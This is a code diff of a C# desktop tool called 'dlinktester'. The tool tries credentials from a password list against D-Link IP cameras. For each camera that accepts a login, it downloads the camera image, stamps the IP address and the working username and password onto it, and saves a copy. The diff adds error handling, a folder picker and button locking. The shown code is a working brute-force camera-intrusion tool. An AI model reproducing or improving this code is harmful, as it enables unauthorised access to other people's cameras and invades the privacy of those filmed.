@@ -23,6 +23,7 @@ namespace dlinktester
         public string passlistFileName;
         public int counter;
         public int iplen;
+        public string directory = System.Reflection.Assembly.GetEntryAssembly().Location + @"\";
 
         public Form1()
         {
@@ -72,39 +73,47 @@ namespace dlinktester
                             {
                                 Console.WriteLine("GOT 200");
                                 client.Credentials = new NetworkCredential(currentcreds[0], currentcreds[1]);
-                                byte[] image = client.DownloadData("http://" + currentip + "/image.jpg");
-                                using (var ms = new MemoryStream(image))
+                                try
                                 {
-                                    b = new Bitmap(ms);
+                                    byte[] image = client.DownloadData("http://" + currentip + "/image.jpg");
+                                    using (var ms = new MemoryStream(image))
+                                    {
+                                        b = new Bitmap(ms);
+                                    }
+                                    using (Graphics graphics = Graphics.FromImage(b))
+                                    {
+                                        PointF firstLocation = new PointF(10f, 10f);
+                                        PointF secondLocation = new PointF(10f, 24f);
+                                        Font lucFont = new Font("Lucida Console", 10);
+                                        PointF Pointvar = new PointF(10f, 10f);
+                                        PointF Pointvar2 = new PointF(10f, 24f);
+                                        SizeF size = graphics.MeasureString(currentip, lucFont);
+                                        SizeF size2 = graphics.MeasureString(currentcreds[0] + " : " + currentcreds[1], lucFont);
+                                        RectangleF rect = new RectangleF(Pointvar, size);
+                                        RectangleF rect2 = new RectangleF(Pointvar2, size2);
+                                        graphics.FillRectangle(Brushes.Black, rect);
+                                        graphics.FillRectangle(Brushes.Black, rect2);
+                                        graphics.DrawString(currentip, lucFont, Brushes.White, firstLocation);
+                                        graphics.DrawString(currentcreds[0] + " : " + currentcreds[1], lucFont, Brushes.White, secondLocation);
+                                        graphics.Dispose();
+                                    }
+                                    this.Invoke(new MethodInvoker(delegate ()
+                                    {
+                                        listBox1.Items.Add(currentip);
+                                        pictureBox1.Image = new Bitmap(b);
+                                    }));
+                                    Random random = new Random();
+                                    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                                    string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
+                                    b.Save(directory + rand + ".jpg", ImageFormat.Jpeg);
+                                    b.Dispose();
+                                    break;
                                 }
-                                using (Graphics graphics = Graphics.FromImage(b))
+                                catch
                                 {
-                                    PointF firstLocation = new PointF(10f, 10f);
-                                    PointF secondLocation = new PointF(10f, 24f);
-                                    Font lucFont = new Font("Lucida Console", 10);
-                                    PointF Pointvar = new PointF(10f, 10f);
-                                    PointF Pointvar2 = new PointF(10f, 24f);
-                                    SizeF size = graphics.MeasureString(currentip, lucFont);
-                                    SizeF size2 = graphics.MeasureString(currentcreds[0] + " : " + currentcreds[1], lucFont);
-                                    RectangleF rect = new RectangleF(Pointvar, size);
-                                    RectangleF rect2 = new RectangleF(Pointvar2, size2);
-                                    graphics.FillRectangle(Brushes.Black, rect);
-                                    graphics.FillRectangle(Brushes.Black, rect2);
-                                    graphics.DrawString(currentip, lucFont, Brushes.White, firstLocation);
-                                    graphics.DrawString(currentcreds[0] + " : " + currentcreds[1], lucFont, Brushes.White, secondLocation);
-                                    graphics.Dispose();
+                                    break;
                                 }
-                                this.Invoke(new MethodInvoker(delegate ()
-                                {
-                                    listBox1.Items.Add(currentip);
-                                    pictureBox1.Image = new Bitmap(b);
-                                }));
-                                Random random = new Random();
-                                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-                                string rand = new string(Enumerable.Repeat(chars, 5).Select(s => s[random.Next(s.Length)]).ToArray());
-                                b.Save(@"C:\Users\puffl\Documents\aztech shiz\dlink" + @"\" + rand +".jpg", ImageFormat.Jpeg);
-                                b.Dispose();
-                                break;
+
                             }
                             else
                             {
@@ -164,6 +173,11 @@ namespace dlinktester
 
         private void button3_Click(object sender, EventArgs e)
         {
+            button1.Enabled = false;
+            button2.Enabled = false;
+            button3.Enabled = false;
+            button4.Enabled = false;
+            checkBox1.Enabled = false;
 
             if (checkBox1.Checked)
             {
@@ -192,6 +206,20 @@ namespace dlinktester
             b.Start();
             c.Start();
             d.Start();
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            using (var fbd = new FolderBrowserDialog())
+            {
+                DialogResult result = fbd.ShowDialog();
+
+                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
+                {
+                    directory = fbd.SelectedPath + @"\";
+                    button4.ForeColor = System.Drawing.Color.Green;
+                }
+            }
         }
     }
 }
